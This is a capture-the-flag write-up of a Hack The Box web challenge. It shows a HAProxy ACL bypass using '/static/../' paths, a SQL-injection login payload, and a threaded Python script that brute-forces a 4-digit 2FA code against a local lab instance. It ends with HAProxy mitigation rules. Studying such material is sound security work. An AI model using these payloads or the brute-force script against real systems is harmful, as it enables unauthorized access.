---
layout: post
title: No-Threshold
date: 2024-03-16 12:16 -0400
img_path: /assets/img/thresHold/
published: true
categories: ["Hack The Box","Web Challenge"]
tags: ["Bypass 403", "HapProxy ACL"]
toc: true
---
# Web challenge  
Prepare for the finest magic products out there. However, please be aware that we've implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.🔮🎩

We saw a shopping page with a login functionality that is forbidden **403**. To add items , appear the message *Login Required* but we can't login because the 403 page, so is this about a 403 bypass ? 
![falsePositives](image.png) 
But all this were falses positives. (don't trust on automated scans)

## Source Code Review

* Inside the config.py file we saw our flag.

This challenge had an interesting configuration, on his Dockerfile we saw they install **HAProxy 2.8.3**, at the time i made this challenge ,this version doesn't have [vulnerabilites](https://www.cvedetails.com/vulnerability-list/vendor_id-11969/Haproxy.html).

Inside the haproxy.cfg config on line 36 we saw 
```conf
    # External users should be blocked from accessing routes under maintenance.
    http-request deny if { path_beg /auth/login }
```
The problem with this its the *path_beg* that will deny all request that start with **/auth/login** but no necesarily protect the endpoint. Because an attacker could circumvent this filter with a path like **/static/../auth/login/**
![403_bypass](image-1.png)
We can configure a rulle on Brup Porxy like this 
![Burp Rule](image-2.png)

Now we can analyze the login source code
```python
def login():
    if request.method == "POST":
        
        username = request.form.get("username")
        password = request.form.get("password")

        if not username or not password:
            return render_template("public/login.html", error_message="Username or password is empty!"), 400
        try:
            user = query_db(
                f"SELECT username, password FROM users WHERE username = '{username}' AND password = '{password}'",
                one=True,
            )

            if user is None:
                return render_template("public/login.html", error_message="Invalid username or password"), 400

            set_2fa_code(4)

            return redirect("/auth/verify-2fa")
```
this login code is vulnerable to sql inyection, so we can bypass the login with ```admin'or 1=1-- -``` 
![bypass_Login](image-3.png)
Now we are presente to 2fa functionality, brute force ? 
```python
def set_2fa_code(d):
    uwsgi.cache_del("2fa-code")
    uwsgi.cache_set(
        "2fa-code", "".join(random.choices(string.digits, k=d)), 300 # valid for 5 min
    )
```
Here's where a new value is set in the uWSGI cache. uwsgi.cache_set is a call to the uWSGI API to set a value in the cache. The first argument is the key under which the value will be stored ("2fa-code").

"".join(random.choices(string.digits, k=d)) generates a random string of digits, where string.digits is a string that contains '0123456789', and random.choices selects k random digits. These are joined without a separator to form a 2FA code.

300 is the lifetime of the cache item in seconds. In this case, it means that the 2FA code will be valid for 300 seconds, or 5 minutes.

The configuration of the haproxy.cfg 
```conf
    # Apply rate limit on the /auth/verify-2fa route.
    acl is_auth_verify_2fa path_beg,url_dec /auth/verify-2fa
    http-request deny deny_status 400 if is_auth_verify_2fa !valid_ipv4
    # Crate a stick-table to track the number of requests from a single IP address. (1min expire)
    stick-table type ip size 100k expire 60s store http_req_rate(60s)
    # Deny users that make more than 20 requests in a small timeframe.
    http-request track-sc0 hdr(X-Forwarded-For) if is_auth_verify_2fa
    http-request deny deny_status 429 if is_auth_verify_2fa { sc_http_req_rate(0) gt 20 }
```
* Rate Limiting on /auth/verify-2fa Route: An Access Control List (ACL) named is_auth_verify_2fa is created to identify requests to the /auth/verify-2fa path. After decodify the URL (%2f -> /)
* Denty with status 404 if the request to /auth/verify-2fa doesn't contain a valid ipv4 in the X-Forwarded-For
![X-Fowarded-For](image-4.png)
* Request Rate Tracking: A stick-table is configured to track the HTTP request rate per IP address over a 60-second interval, with a maximum size of 100k entries. This is used to enforce rate limits on a per-IP basis.
* Rate Limit Enforcement: Requests exceeding 20 requests per minute to the /auth/verify-2fa route, as determined by the stick-table, are denied with a 429 status code. This helps mitigate potential brute force attacks.

Mayority of this rules are base on the ACL **is_auth_verify_2fa** that uses the [*path_beg*](https://www.haproxy.com/blog/path-based-routing-with-haproxy) which compares the beginning of the path. As with /auth/login we can bypass this rule with something like /static/../auth/verify-2fa.

## Local Testing 

Using burpsuite we will test this brute force attack against local server.
Configure inside Intruder tab with a pitchfork attack, the request with two paylaods, once for the X-Forwarded-For adn the other offcourse for the 2FA token.
![alt text](image-5.png)

For the first payload, we will use a list of 10,000 different IPs, ranging from 1.1.1.1 to 1.1.40.16. For the second payload, we will go through all combinations from 0000 to 9999.
![Burp_BruteForce](image-6.png)
Now we use the cookie to request /dashboard endpoint and receive the flag

![Poc_Flag](image-7.png)

## Proof of Concept 

```python
import os, time , requests 
from concurrent.futures import ThreadPoolExecutor

URL="http://127.0.0.1:1337"
codes = [str(i).zfill(4) for i in range(10000)]
num_hilos = 50  # Ajusta según tus necesidades
proxy_burp = {'http':'192.168.1.83:8080','https':'192.168.1.83:8080'}

# Enviar la peticion POST al Login con al inyección SQL

login_bypass = f'{URL}/static/../auth/login'
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"}
burp0_data = {"username": "admin'or 1=1-- -", "password": "123"}
requests.post(login_bypass, headers=burp0_headers, data=burp0_data, allow_redirects=True, proxies=proxy_burp)

def enviar_peticion(code):
    url_2fa = f'{URL}/static/../auth/verify-2fa'
    post_data = {"2fa-code":code}
    try:
        respuesta = requests.post(url_2fa, data=post_data, allow_redirects=True, proxies=proxy_burp)
        if 'Dashboard' in respuesta.text:
            print(respuesta.text)
    except Exception as e:
        print(f"Error al enviar petición a {url_2fa}: {e}")


with ThreadPoolExecutor(max_workers=num_hilos) as executor:
    executor.map(enviar_peticion, codes)
```

I notice that the X-Forwarded-For header was not necesary once you bypass the ACL(is_auth_verify_2fa). Also this python script require Burp Proxy Rules to change the path /static/../<> since requests library always normalize the path. 


## Mitigation 

We can improve the ACL on the haproxy.conf, explicitly specifying the paths available. 

```conf
acl valid_path path_beg,url_dec -i /auth/verify-2fa /path2 /path3
http-request deny if !valid_path
```

Also we can block **../** 
```conf
acl path_traversal url_dec -m sub ../
http-request deny if path_traversal
```